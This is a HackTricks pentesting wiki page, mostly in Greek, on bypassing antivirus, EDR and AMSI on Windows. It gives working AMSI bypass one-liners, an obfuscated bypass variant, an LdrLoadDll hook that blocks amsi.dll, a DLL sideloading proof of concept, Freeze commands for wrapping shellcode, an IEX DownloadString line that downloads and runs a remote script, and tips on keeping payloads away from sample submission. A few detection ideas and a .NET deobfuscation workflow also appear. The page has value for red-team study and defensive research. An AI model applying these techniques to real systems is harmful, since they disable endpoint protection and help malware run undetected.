# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Αυτή η σελίδα γράφτηκε από** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Απενεργοποίηση Defender

- [defendnot](https://github.com/es3n1n/defendnot): Εργαλείο για την απενεργοποίηση του Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Εργαλείο για την απενεργοποίηση του Windows Defender προσποιούμενο άλλο AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.

### **Static detection**

Static detection is achieved by flagging known malicious strings or arrays of bytes in a binary or script, and also extracting information from the file itself (e.g. file description, company name, digital signatures, icon, checksum, etc.). This means that using known public tools may get you caught more easily, as they've probably been analyzed and flagged as malicious. There are a couple of ways of getting around this sort of detection:

- **Encryption**

Αν κρυπτογραφήσετε το binary, δεν θα υπάρχει τρόπος για το AV να εντοπίσει το πρόγραμμα σας, αλλά θα χρειαστείτε κάποιο loader για να το αποκρυπτογραφήσετε και να το εκτελέσετε στη μνήμη.

- **Obfuscation**

Κάποιες φορές το μόνο που χρειάζεται είναι να αλλάξετε μερικά strings στο binary ή στο script για να περάσετε το AV, αλλά αυτό μπορεί να γίνει χρονοβόρο ανάλογα με το τι προσπαθείτε να obfuscate.

- **Custom tooling**

Αν αναπτύξετε τα δικά σας εργαλεία, δεν θα υπάρχουν γνωστές κακόβουλες υπογραφές, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.

> [!TIP]
> Ένας καλός τρόπος για να ελέγξετε το static detection του Windows Defender είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Βασικά χωρίζει το αρχείο σε πολλαπλά segments και ζητά από τον Defender να σκανάρει το κάθε ένα ξεχωριστά· έτσι, μπορεί να σας πει ακριβώς ποια strings ή bytes σημαδεύονται στο binary σας.

Συνιστώ ανεπιφύλακτα να δείτε αυτή την [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) για πρακτικό AV Evasion.

### **Dynamic analysis**

Dynamic analysis είναι όταν το AV τρέχει το binary σας σε sandbox και παρακολουθεί για κακόβουλη δραστηριότητα (π.χ. προσπάθεια να αποκρυπτογραφήσει και να διαβάσει τους κωδικούς του browser, εκτέλεση minidump του LSASS, κ.λπ.). Αυτό το κομμάτι μπορεί να είναι πιο δύσκολο, αλλά εδώ είναι μερικά πράγματα που μπορείτε να κάνετε για να αποφύγετε τα sandboxes.

- **Sleep before execution** Ανάλογα με το πώς είναι υλοποιημένο, μπορεί να είναι πολύ καλός τρόπος παράκαμψης της dynamic analysis των AV. Τα AV έχουν πολύ λίγο χρόνο για να σκανάρουν αρχεία ώστε να μην διαταράσσουν τη ροή εργασίας του χρήστη, οπότε η χρήση μεγάλων sleeps μπορεί να διαταράξει την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά sandboxes των AV μπορούν απλά να παραλείψουν το sleep ανάλογα με την υλοποίηση.
- **Checking machine's resources** Συνήθως τα Sandboxes έχουν πολύ λίγους πόρους (π.χ. < 2GB RAM), διαφορετικά θα επιβράδυναν τον υπολογιστή του χρήστη. Μπορείτε επίσης να γίνετε πολύ δημιουργικοί εδώ, για παράδειγμα ελέγχοντας τη θερμοκρασία της CPU ή ακόμα και την ταχύτητα των ανεμιστήρων — δεν όλα θα είναι υλοποιημένα στο sandbox.
- **Machine-specific checks** Αν θέλετε να στοχεύσετε έναν χρήστη του οποίου ο workstation είναι μέλος του domain "contoso.local", μπορείτε να ελέγξετε το domain του υπολογιστή για να δείτε αν ταιριάζει με αυτό που έχετε ορίσει· αν δεν ταιριάζει, το πρόγραμμα σας μπορεί να τερματίσει.

Αποδεικνύεται ότι το Sandbox του Microsoft Defender έχει computername HAL9TH, οπότε μπορείτε να ελέγξετε το όνομα του υπολογιστή στο malware σας πριν από την εκτέλεση — αν το όνομα ταιριάζει με HAL9TH, σημαίνει ότι βρίσκεστε μέσα στο sandbox του defender και τότε μπορείτε να κάνετε το πρόγραμμα σας να τερματίσει.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>πηγή: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Κάποιες άλλες πολύ καλές συμβουλές από [@mgeeky](https://twitter.com/mariuszbit) για αντιμετώπιση Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Όπως είπαμε και πριν, **public tools** θα τελικά **ανιχνευτούν**, οπότε πρέπει να αναρωτηθείτε κάτι:

Για παράδειγμα, αν θέλετε να dumpάρετε το LSASS, **χρειάζεται πραγματικά να χρησιμοποιήσετε το mimikatz**; Ή θα μπορούσατε να χρησιμοποιήσετε κάποιο άλλο project που είναι λιγότερο γνωστό και επίσης κάνει dump LSASS.

Η σωστή απάντηση είναι πιθανότατα το δεύτερο. Παίρνοντας το mimikatz ως παράδειγμα, μάλλον είναι ένα από τα, αν όχι το πιο σημαδεμένα κομμάτι malware από AVs και EDRs — ενώ το project είναι πολύ καλό, είναι επίσης εφιάλτης να το χειριστείς για να αποφύγεις AVs, οπότε απλά ψάξτε για εναλλακτικές για αυτό που προσπαθείτε να πετύχετε.

> [!TIP]
> Όταν τροποποιείτε τα payloads σας για evasion, βεβαιωθείτε ότι έχετε **απενεργοποιήσει την αυτόματη υποβολή δειγμάτων** στον defender, και παρακαλώ, σοβαρά, **DO NOT UPLOAD TO VIRUSTOTAL** αν ο στόχος σας είναι η επίτευξη evasion μακροπρόθεσμα. Αν θέλετε να ελέγξετε αν το payload σας ανιχνεύεται από κάποιο συγκεκριμένο AV, εγκαταστήστε το AV σε ένα VM, δοκιμάστε να απενεργοποιήσετε την αυτόματη υποβολή δειγμάτων και δοκιμάστε εκεί μέχρι να μείνετε ικανοποιημένοι με το αποτέλεσμα.

## EXEs vs DLLs

Whenever it's possible, always **prioritize using DLLs for evasion**, in my experience, DLL files are usually **way less detected** and analyzed, so it's a very simple trick to use in order to avoid detection in some cases (if your payload has some way of running as a DLL of course).

As we can see in this image, a DLL Payload from Havoc has a detection rate of 4/26 in antiscan.me, while the EXE payload has a 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me σύγκριση ενός Havoc EXE payload έναντι ενός Havoc DLL</p></figcaption></figure>

Now we'll show some tricks you can use with DLL files to be much more stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.

You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων που είναι ευάλωτα σε DLL hijacking μέσα στο "C:\Program Files\\" και τα DLL αρχεία που προσπαθούν να φορτώσουν.

Συνιστώ ανεπιφύλακτα να **εξερευνήσετε οι ίδιοι τα DLL Hijackable/Sideloadable programs**, αυτή η τεχνική είναι αρκετά stealthy όταν γίνεται σωστά, αλλά αν χρησιμοποιήσετε δημόσια γνωστά DLL Sideloadable programs, μπορεί να εντοπιστείτε εύκολα.

Απλώς τοποθετώντας ένα malicious DLL με το όνομα που ένα πρόγραμμα περιμένει να φορτώσει, δεν θα φορτώσει το payload σας, καθώς το πρόγραμμα περιμένει κάποιες συγκεκριμένες συναρτήσεις μέσα σε εκείνο το DLL. Για να διορθώσουμε αυτό το πρόβλημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

**DLL Proxying** προωθεί τις κλήσεις που κάνει ένα πρόγραμμα από το proxy (και malicious) DLL στο original DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας την εκτέλεση του payload σας.

Θα χρησιμοποιήσω το έργο [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) από [@flangvik](https://twitter.com/Flangvik/)

Αυτά είναι τα βήματα που ακολούθησα:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL και την αρχική μετονομασμένη DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Τόσο το shellcode μας (κωδικοποιημένο με [SGN](https://github.com/EgeBalci/sgn)) όσο και το proxy DLL έχουν 0/26 ποσοστό ανίχνευσης στο [antiscan.me](https://antiscan.me)! Θα το χαρακτήριζα επιτυχία.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Σας συνιστώ ανεπιφύλακτα να παρακολουθήσετε [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) για το DLL Sideloading και επίσης [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) για να μάθετε περισσότερα σχετικά με όσα συζητήσαμε σε μεγαλύτερο βάθος.

### Κατάχρηση των Forwarded Exports (ForwardSideLoading)

Τα Windows PE modules μπορούν να εξάγουν συναρτήσεις που στην πραγματικότητα είναι "forwarders": αντί να δείχνουν σε κώδικα, η εγγραφή εξαγωγής περιέχει ένα ASCII string της μορφής `TargetDll.TargetFunc`. Όταν ένας caller επιλύει την εξαγωγή, ο Windows loader θα:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Βασικές συμπεριφορές που πρέπει να κατανοήσετε:
- Αν το `TargetDll` είναι KnownDLL, αυτό παρέχεται από τον προστατευμένο KnownDLLs namespace (π.χ., ntdll, kernelbase, ole32).
- Αν το `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η κανονική σειρά αναζήτησης DLL, η οποία περιλαμβάνει τον κατάλογο του module που πραγματοποιεί την forward resolution.

Αυτό επιτρέπει ένα έμμεσο sideloading primitive: βρείτε ένα signed DLL που εξάγει μια συνάρτηση forwarded σε ένα μη-KnownDLL όνομα module, και στη συνέχεια co-locate το signed DLL με ένα attacker-controlled DLL με ακριβώς το ίδιο όνομα όπως το forwarded target module. Όταν η forwarded export καλείται, ο loader επιλύει το forward και φορτώνει το DLL σας από τον ίδιο κατάλογο, εκτελώντας το DllMain σας.

Παράδειγμα παρατηρήθηκε σε Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` δεν είναι KnownDLL, οπότε επιλύεται μέσω της κανονικής σειράς αναζήτησης.

PoC (copy-paste):
1) Αντιγράψτε το υπογεγραμμένο system DLL σε έναν εγράψιμο φάκελο
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Τοποθετήστε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Ένα ελάχιστο DllMain αρκεί για να επιτευχθεί εκτέλεση κώδικα; δεν χρειάζεται να υλοποιήσετε την προωθημένη συνάρτηση για να ενεργοποιηθεί το DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Ενεργοποιήστε την προώθηση με ένα υπογεγραμμένο LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (υπογεγραμμένο) φορτώνει το side-by-side `keyiso.dll` (υπογεγραμμένο)
- Κατά την επίλυση του `KeyIsoSetAuditingInterface`, ο loader ακολουθεί το forward προς το `NCRYPTPROV.SetAuditingInterface`
- Στη συνέχεια ο loader φορτώνει το `NCRYPTPROV.dll` από `C:\test` και εκτελεί το `DllMain` του
- Αν το `SetAuditingInterface` δεν είναι υλοποιημένο, θα λάβετε σφάλμα "missing API" μόνο αφού το `DllMain` έχει ήδη εκτελεστεί

Hunting tips:
- Επικεντρωθείτε σε forwarded exports όπου το target module δεν είναι KnownDLL. Τα KnownDLLs αναγράφονται υπό `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Μπορείτε να απαριθμήσετε forwarded exports με εργαλεία όπως:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Δείτε τον κατάλογο forwarder των Windows 11 για να αναζητήσετε υποψήφιους: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Παρακολουθήστε τα LOLBins (π.χ., rundll32.exe) που φορτώνουν signed DLLs από non-system paths, και στη συνέχεια φορτώνουν non-KnownDLLs με το ίδιο base name από αυτόν τον φάκελο
- Ειδοποίηση για αλυσίδες process/module όπως: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` σε user-writable paths
- Επιβάλλετε πολιτικές ακεραιότητας κώδικα (WDAC/AppLocker) και απαγορεύστε write+execute στους καταλόγους εφαρμογών

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με stealthy τρόπο.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Η αποφυγή ανίχνευσης είναι απλώς ένα παιχνίδι γάτας και ποντικιού — αυτό που δουλεύει σήμερα μπορεί να ανιχνευτεί αύριο, οπότε μην βασίζεστε σε ένα μόνο εργαλείο· αν είναι δυνατόν, προσπαθήστε να συνδυάσετε πολλαπλές τεχνικές evasion.

## AMSI (Anti-Malware Scan Interface)

AMSI δημιουργήθηκε για να αποτρέψει "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, οι AVs μπορούσαν μόνο να σαρώσουν **files on disk**, οπότε αν κάπως καταφέρνατε να εκτελέσετε payloads **directly in-memory**, οι AVs δεν μπορούσαν να κάνουν τίποτα για να το αποτρέψουν, καθώς δεν είχαν επαρκή ορατότητα.

Η λειτουργία AMSI είναι ενσωματωμένη στα ακόλουθα στοιχεία των Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Επιτρέπει στις λύσεις antivirus να εξετάζουν τη συμπεριφορά των scripts εκθέτοντας τα περιεχόμενα των scripts σε μορφή που είναι τόσο μη κρυπτογραφημένη όσο και μη unobfuscated.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατηρήστε πώς προθέτει `amsi:` και μετά το μονοπάτι προς το εκτελέσιμο από το οποίο τρέχει το script — στην προκειμένη περίπτωση, powershell.exe

Δεν αποθέσαμε κανένα αρχείο στο δίσκο, αλλά παρόλα αυτά πιαστήκαμε in-memory εξαιτίας του AMSI.

Επιπλέον, ξεκινώντας με **.NET 4.8**, ο κώδικας C# περνά επίσης από το AMSI. Αυτό επηρεάζει ακόμη και το `Assembly.Load(byte[])` για εκτέλεση in-memory. Γι' αυτό προτείνεται η χρήση χαμηλότερων εκδόσεων του .NET (όπως 4.7.2 ή παλαιότερες) για εκτέλεση in-memory αν θέλετε να αποφύγετε το AMSI.

Υπάρχουν μερικοί τρόποι για να παρακάμψετε το AMSI:

- **Obfuscation**

Εφόσον το AMSI λειτουργεί κυρίως με στατικές ανιχνεύσεις, η τροποποίηση των scripts που προσπαθείτε να φορτώσετε μπορεί να είναι ένας καλός τρόπος για να αποφύγετε την ανίχνευση.

Ωστόσο, το AMSI έχει τη δυνατότητα να απο-αποκρύπτει (unobfuscate) scripts ακόμη και αν αυτά έχουν πολλαπλά επίπεδα obfuscation, οπότε το obfuscation μπορεί να είναι κακή επιλογή ανάλογα με τον τρόπο που γίνεται. Αυτό καθιστά την παράκαμψη όχι τόσο ευθύ. Παρ' όλα αυτά, μερικές φορές αρκεί να αλλάξετε μερικά ονόματα μεταβλητών για να τα καταφέρετε, οπότε εξαρτάται από το πόσο έχει σημαδευτεί κάτι.

- **AMSI Bypass**

Εφόσον το AMSI υλοποιείται φορτώνοντας ένα DLL στη διεργασία του powershell (επίσης cscript.exe, wscript.exe, κ.λπ.), είναι δυνατό να το παραποιήσει κάποιος εύκολα ακόμη και εκτελούμενος ως μη προνομιακός χρήστης. Λόγω αυτού του σφάλματος στην υλοποίηση του AMSI, ερευνητές έχουν βρει πολλούς τρόπους για να παρακάμψουν τη σάρωση του AMSI.

**Forcing an Error**

Η εξαναγκασμένη αποτυχία της αρχικοποίησης του AMSI (amsiInitFailed) θα έχει ως αποτέλεσμα να μην ξεκινήσει καμία σάρωση για την τρέχουσα διεργασία. Αρχικά αυτό αποκαλύφθηκε από [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft ανέπτυξε μια υπογραφή για να αποτρέψει ευρύτερη χρήση.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Αρκούσε μία μόνο γραμμή κώδικα powershell για να καταστήσει το AMSI μη λειτουργικό για την τρέχουσα διαδικασία powershell. Αυτή η γραμμή, φυσικά, έχει επισημανθεί από το ίδιο το AMSI, οπότε χρειάζεται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.

Εδώ είναι ένας τροποποιημένος AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Λάβετε υπόψη ότι αυτό μάλλον θα επισημανθεί μόλις δημοσιευτεί αυτή η ανάρτηση, οπότε μην δημοσιεύετε κώδικα αν σκοπεύετε να παραμείνετε απαρατήρητοι.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Διαβάστε [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για πιο λεπτομερή εξήγηση.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

Περίγραμμα υλοποίησης (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Σημειώσεις
- Works across PowerShell, WScript/CScript and custom loaders alike (anything that would otherwise load AMSI).
- Συνδυάστε με την παροχή scripts μέσω stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) για να αποφύγετε μακροσκελή αποτυπώματα στη γραμμή εντολών.
- Παρατηρείται ότι χρησιμοποιείται από loaders που εκτελούνται μέσω LOLBins (π.χ., `regsvr32` που καλεί `DllRegisterServer`).

Αυτό το εργαλείο [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) επίσης δημιουργεί script για να παρακάμψει το AMSI.

**Αφαίρεση της ανιχνευμένης υπογραφής**

Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσετε την ανιχνευμένη υπογραφή AMSI από τη μνήμη της τρέχουσας διαδικασίας. Το εργαλείο αυτό λειτουργεί σαρώνοντας τη μνήμη της τρέχουσας διαδικασίας για την υπογραφή AMSI και στη συνέχεια επικαλύπτοντάς την με εντολές NOP, αφαιρώντας την ουσιαστικά από τη μνήμη.

**Προϊόντα AV/EDR που χρησιμοποιούν το AMSI**

Μπορείτε να βρείτε μια λίστα προϊόντων AV/EDR που χρησιμοποιούν το AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Χρήση PowerShell έκδοσης 2**
Αν χρησιμοποιήσετε PowerShell έκδοσης 2, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής:
```bash
powershell.exe -version 2
```
## PS Logging

Το PowerShell logging είναι μια λειτουργία που επιτρέπει την καταγραφή όλων των εντολών PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για έλεγχο και αντιμετώπιση προβλημάτων, αλλά μπορεί επίσης να αποτελεί πρόβλημα για επιτιθέμενους που θέλουν να αποφύγουν τον εντοπισμό.

Για να παρακάμψετε το PowerShell logging, μπορείτε να χρησιμοποιήσετε τις παρακάτω τεχνικές:

- **Disable PowerShell Transcription and Module Logging**: Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτόν τον σκοπό.
- **Use Powershell version 2**: Αν χρησιμοποιήσετε PowerShell version 2, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να τρέξετε τα scripts σας χωρίς να σαρώνονται από AMSI. Μπορείτε να το κάνετε: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Χρησιμοποιήστε [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να εκκινήσετε ένα PowerShell χωρίς defenses (αυτό είναι που χρησιμοποιεί το `powerpick` του Cobal Strike).


## Obfuscation

> [!TIP]
> Πολλές τεχνικές obfuscation βασίζονται στην κρυπτογράφηση δεδομένων, που αυξάνει την εντροπία του binary και καθιστά ευκολότερο για AVs και EDRs να το εντοπίσουν. Να είστε προσεκτικοί με αυτό και ίσως εφαρμόσετε κρυπτογράφηση μόνο σε συγκεκριμένα τμήματα του κώδικα που είναι ευαίσθητα ή χρειάζεται να κρυφτούν.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Κατά την ανάλυση malware που χρησιμοποιεί ConfuserEx 2 (ή εμπορικά forks) είναι συνηθισμένο να αντιμετωπίζετε πολλαπλά επίπεδα προστασίας που θα μπλοκάρουν decompilers και sandboxes. Η παρακάτω ροή εργασίας επαναφέρει με αξιοπιστία ένα σχεδόν-πρωτότυπο IL που μπορεί στη συνέχεια να απο-συναρμολογηθεί σε C# σε εργαλεία όπως dnSpy ή ILSpy.

1.  Anti-tampering removal – ConfuserEx κρυπτογραφεί κάθε *method body* και το αποκρυπτογραφεί μέσα στον static constructor του *module* (`<Module>.cctor`). Αυτό επίσης τροποποιεί το PE checksum, οπότε οποιαδήποτε αλλαγή θα καταστρέψει το binary. Χρησιμοποιήστε **AntiTamperKiller** για να εντοπίσετε τους κρυπτογραφημένους πίνακες μεταδεδομένων, να ανακτήσετε τα XOR keys και να ξαναγράψετε ένα καθαρό assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Η έξοδος περιέχει τις 6 παραμέτρους anti-tamper (`key0-key3`, `nameHash`, `internKey`) που μπορεί να είναι χρήσιμες όταν φτιάχνετε τον δικό σας unpacker.

2.  Symbol / control-flow recovery – δώστε το *clean* αρχείο στο **de4dot-cex** (ένα ConfuserEx-aware fork του de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – επιλέγει το ConfuserEx 2 profile  
• de4dot θα αναιρέσει το control-flow flattening, θα αποκαταστήσει τα πρωτότυπα namespaces, classes και ονόματα μεταβλητών και θα αποκρυπτογραφήσει σταθερές συμβολοσειρές.

3.  Proxy-call stripping – ConfuserEx αντικαθιστά άμεσες κλήσεις με ελαφριά wrappers (a.k.a *proxy calls*) για να δυσχεράνει περαιτέρω την απο-συναρμολόγηση. Αφαιρέστε τα με **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Μετά από αυτό το βήμα θα πρέπει να δείτε κανονικές .NET API όπως `Convert.FromBase64String` ή `AES.Create()` αντί για αδιαφανείς wrapper συναρτήσεις (`Class8.smethod_10`, …).

4.  Manual clean-up – τρέξτε το αποτέλεσμα υπό dnSpy, ψάξτε για μεγάλα Base64 blobs ή χρήση `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσετε το *πραγματικό* payload. Συχνά το malware το αποθηκεύει ως TLV-encoded byte array που αρχικοποιείται μέσα στο `<Module>.byte_0`.

Η παραπάνω αλυσίδα αποκαθιστά τη ροή εκτέλεσης **χωρίς** να χρειάζεται να τρέξετε το κακόβουλο δείγμα – χρήσιμο όταν δουλεύετε σε offline workstation.

> 🛈  Το ConfuserEx παράγει ένα custom attribute με όνομα `ConfusedByAttribute` που μπορεί να χρησιμοποιηθεί ως IOC για αυτόματη τριάζ των samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Στόχος αυτού του project είναι να παρέχει ένα ανοικτού κώδικα fork της [LLVM](http://www.llvm.org/) σουίτας μεταγλώττισης ικανής να προσφέρει αυξημένη ασφάλεια λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator δείχνει πώς να χρησιμοποιηθεί η γλώσσα `C++11/14` για να παραχθεί, κατά το compile time, obfuscated code χωρίς τη χρήση εξωτερικού εργαλείου και χωρίς τροποποίηση του compiler.
